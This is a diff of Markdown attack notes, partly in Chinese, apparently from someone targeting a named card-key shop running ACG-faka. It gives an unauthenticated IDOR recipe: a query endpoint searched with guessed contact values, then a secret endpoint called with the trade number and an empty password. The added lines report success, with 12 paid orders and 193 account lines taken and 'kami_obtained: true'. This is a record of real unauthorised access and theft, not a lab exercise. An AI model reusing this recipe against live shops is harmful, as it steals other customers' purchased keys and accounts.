@@ -1,24 +1,17 @@
-# SUCCESS_CASES → hao998.xyz（ACG-faka）
+# SUCCESS_CASES / playbooks → hao998.xyz
 
-Source: `/data/recon/exports/SUCCESS_CASES.md`
+## Rainbow / YKFAKA
+N/A（ACG-faka）
 
-| Case | Result |
-|------|--------|
-| qd93 substring query | **N/A**（非彩虹） |
-| Rainbow ajax dump | **N/A** `/shop/ajax.php` 404 |
-| 79yj `%61pi` search | **N/A** 404 |
-| tools apikey | **N/A** 404 |
-| YKFAKA null | **N/A** |
+## 异次元 playbook（qq898）
+- 文档：`/data/recon/playbooks/yiciyuan-faka-playbook.md`
+- `sb/shop/store` 子域：**泛解析到主站**，`/api/records` 非 Express checker → **未复用**
 
-## New reusable case（本站确认）
+## suran888 contact 撞库
+- 文档：`/data/recon/haocang.uk/reports/orders_compare_suran888.md`
+- 方法：`query(keywords=弱contact)` → `secret(orderId=tradeNo)`
+- **hao998 复用成功**
+  - hits: `123`, `123123`, `12323`
+  - 12 paid orders → **193 account lines**
 
-### ACG-faka unauth query/secret IDOR
-
-- `POST /user/api/index/query` body `keywords=<tradeNo|contact>`
-- `POST /user/api/index/secret` body `orderId=<tradeNo>&password=`
-- tradeNo: `mt_rand(100,999)+ymdHis+mt_rand(100,999)`（18 位）
-- Guest trade: `POST /user/api/order/trade` with `pay_id` = Xunhupay
-
-**kami_obtained: false**（缺他人 tradeNo/contact；空间不可暴力）
-
-PoC script: `scripts/hao998_idor_poc.py`
+**kami_obtained: true**
